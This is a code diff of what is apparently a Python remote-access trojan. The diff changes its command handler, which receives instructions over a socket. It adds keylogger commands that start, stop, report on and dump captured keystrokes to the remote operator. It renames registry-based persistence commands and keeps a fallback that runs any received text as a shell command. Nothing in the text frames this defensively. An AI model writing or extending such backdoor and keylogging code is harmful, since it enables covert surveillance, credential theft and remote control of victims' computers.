@@ -222,33 +222,58 @@ def cmd(c, data):
             c.send(b"[i] Directory changed")
             return
 
-        if data == "/check_persistence":
+        if data == "/persistence status":
             if check_persistence():
-                c.send(f"[+] Persistence status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n".encode())
+                c.send(f"[+] Persistence status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n\n".encode())
                 return 
             else:
-                c.send(b"[-] Persistence status: Fail")
+                c.send(b"[-] Persistence status: Fail\n\n")
                 return
 
-        if data == "/setup_persistence":
+        elif data == "/persistence setup":
             setup_persistence()
-            c.send(b"[+] Done")
+            c.send(b"[+] Done\n")
             return
 
-        p = subprocess.Popen(
-            data,
-            shell=True,
-            stdin=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdout=subprocess.PIPE
-        )
+        elif data == "/keylog start":
+            response = start_keylogger()
+            c.send(response.encode() + b"\n\n")
+            return
 
-        output = p.stdout.read() + p.stderr.read()
+        elif data == "/keylog stop":
+            response = stop_keylogger()
+            c.send(response.encode() + b"\n\n")
+            return
+
+        elif data == "/keylog dump":
+            response = get_keylog_data()
+            c.send(response.encode() + b"\n\n")
+            return
         
-        if output:
-            c.send(output + b"\n")
-        else:
-            c.send(b"[+] Command executed\n")
+        elif data == "/keylog status":
+            status = "Running" if keylogger_active else "Stopped"
+            buffer_size = len(keylog_buffer)
+
+            response = f'[i] Keylogger status: {status}\n Buffer: {buffer_size} keys'
+
+            c.send(response.encode() + b"\n\n")
+            return
+
+        else: 
+            p = subprocess.Popen(
+                data,
+                shell=True,
+                stdin=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                stdout=subprocess.PIPE
+            )
+
+            output = p.stdout.read() + p.stderr.read()
+
+            if output:
+                c.send(output + b"\n")
+            else:
+                c.send(b"[+] Command executed\n\n")
 
     except Exception as e: 
         print(f'CMD function error: {e}')
